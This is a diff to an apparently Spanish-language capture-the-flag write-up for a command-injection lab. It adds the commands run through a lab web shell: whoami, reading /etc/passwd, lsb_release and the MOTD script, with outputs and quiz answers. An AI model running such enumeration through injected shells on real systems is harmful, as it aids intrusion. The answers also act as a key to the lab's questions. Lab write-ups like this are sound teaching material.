@@ -46,19 +46,51 @@ navigate to http://10.10.145.63/evilshell.php.
     0
 
 ¿Con qué usuario se ejecuta esta aplicación?
- 
+  
+    EvilShell  
+    whoami
+    www-data 
+
     www-data 
 
 ¿Cómo está configurado el shell del usuario?
  
+    EvilShell
+    cat /etc/passwd
+
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
+
     /usr/sbin/nologin 
 
 ¿Qué versión de Ubuntu se está ejecutando?
  
+    EvilShell
+    lsb_release -a
+    Distributor ID: Ubuntu 
+    Description: Ubuntu 18.04.4 LTS 
+    Release: 18.04 
+    Codename: bionic  
+    
     18.04.4
  
 Imprime el MOTD. ¿Qué bebida favorita se muestra?
  
+    EvilShell
+    cat /etc/update-motd.d/00-header
+    #!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # 
+    # Authors: Dustin Kirkland # 
+    # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General 
+    Public License as published by # the Free Software Foundation; either version 2 of the License, or 
+    # (at your option) any later version. # # This program is distributed in the hope that it will be useful, 
+    # but WITHOUT ANY WARRANTY; without even the implied warranty of 
+    # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # 
+    # You should have received a copy of the GNU General Public License along # with this program; if not, write to the 
+    Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. 
+    [ -r /etc/lsb-release ] && . /etc/lsb-release if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then 
+    # Fall back to using the very slow lsb_release utility DISTRIB_DESCRIPTION=$(lsb_release -s -d) fi printf 
+    "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)" 
+    DR PEPPER MAKES THE WORLD TASTE BETTER! 
+    
     DR PEPPER
 
 ## [Severity 2] Broken Authentication Practical
